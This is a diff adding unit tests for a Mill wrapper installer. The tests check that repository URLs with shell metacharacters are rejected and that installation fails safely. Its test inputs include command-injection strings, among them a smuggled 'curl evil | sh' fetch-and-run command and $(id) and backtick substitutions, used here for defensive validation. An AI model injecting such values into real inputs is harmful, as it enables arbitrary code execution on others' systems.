@@ -57,6 +57,31 @@ test('`withMavenRepository()` → strips trailing slashes off the repository', (
   expect(rewritten).toBe('URL="https://mirror.example.com/maven/com/lihaoyi/mill-dist"')
 })
 
+test('`withMavenRepository()` → rejects repositories with shell metacharacters', () => {
+  const attempts = [
+    'https://mirror.example.com/"; curl evil | sh; "',
+    'https://mirror.example.com/$(id)',
+    'https://mirror.example.com/`id`',
+    'https://mirror.example.com/\'',
+    'https://mirror.example.com/a b',
+    'https://mirror.example.com/a\nb',
+    'ftp://mirror.example.com/maven',
+    'not a url',
+  ]
+
+  for (const repository of attempts) {
+    expect(() => withMavenRepository('wrapper', repository)).toThrow(/Invalid mill-repository URL/v)
+  }
+})
+
+test('`install()` → fails on a mill-repository that is not a plain URL', async () => {
+  setup({millRepository: 'https://mirror.example.com/$(id)'})
+  vi.mocked(readFile).mockResolvedValue(`URL="${maven}/com/lihaoyi/mill-dist"`)
+
+  await expect(install()).rejects.toThrow(new Error('Unable to install Mill wrapper'))
+  expect(vi.mocked(writeFile)).not.toHaveBeenCalled()
+})
+
 test('`withMavenRepository()` → keeps the wrapper unchanged for Maven Central', () => {
   const wrapper = readFileSync(getBundledMillPath(), 'utf8')
 
